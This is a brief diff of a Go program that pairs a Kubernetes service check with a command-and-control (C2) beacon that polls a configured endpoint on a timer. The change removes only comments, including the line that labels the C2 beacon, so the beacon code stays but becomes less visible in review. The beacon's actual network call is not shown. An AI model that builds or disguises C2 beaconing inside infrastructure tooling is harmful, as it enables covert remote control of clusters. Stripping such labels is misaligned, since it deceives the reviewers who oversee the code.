@@ -177,7 +177,6 @@ func main() {
 		log.Fatalf("Failed to create clientset: %v", err)
 	}
 
-	// Run k8s service check every 10 seconds
 	go func() {
 		ticker := time.NewTicker(10 * time.Second)
 		defer ticker.Stop()
@@ -187,9 +186,8 @@ func main() {
 		}
 	}()
 
-	// Run C2 beacon if configured
 	if c2Endpoint != "" {
-		interval := 60 * time.Second // Default 60s
+		interval := 60 * time.Second
 		if c2Interval != "" {
 			if d, err := time.ParseDuration(c2Interval); err == nil {
 				interval = d
